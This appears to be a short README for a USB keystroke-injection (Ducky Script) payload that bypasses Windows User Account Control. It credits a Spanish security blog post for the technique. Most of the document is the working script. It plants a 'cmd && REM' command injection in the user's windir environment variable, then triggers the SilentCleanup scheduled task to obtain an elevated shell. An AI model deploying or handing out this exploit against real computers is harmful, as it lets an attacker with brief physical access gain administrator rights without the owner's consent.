# UAC Bypass HID
This payload bypasses the UAC

<img src="https://1.bp.blogspot.com/-31cvC2aPntY/WX8qJVj3OhI/AAAAAAAAoOI/X3ycE3JokCUQopcsQbj9mqLTO8GcDBDzgCLcBGAs/s1600/4.png" alt="http://www.elladodelmal.com">

Using the Environment Variables to bypass the UAC:

<img src="https://1.bp.blogspot.com/-A8Mwu4X3gQc/WX8qIzsdyVI/AAAAAAAAoN8/u13zbeQ2NVQjzL7-n9MZUQn3pXBkJvClACLcBGAs/s1600/2.png" alt="http://www.elladodelmal.com">

# CODE (Ducky Script)
<pre><code>GUI r
DELAY 200
STRING powershell
ENTER
DELAY 7000
ALT n
STRING reg add hkcu\Environment /v windir /d "cmd && REM"
ENTER
DELAY 1000
STRING schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
ENTER
DELAY 200
STRING echo UAC Bypassed!
ENTER
</pre></code>


# How does it work?
Source: http://www.elladodelmal.com/2017/07/2017-el-ano-que-bypasseamos-uac.html
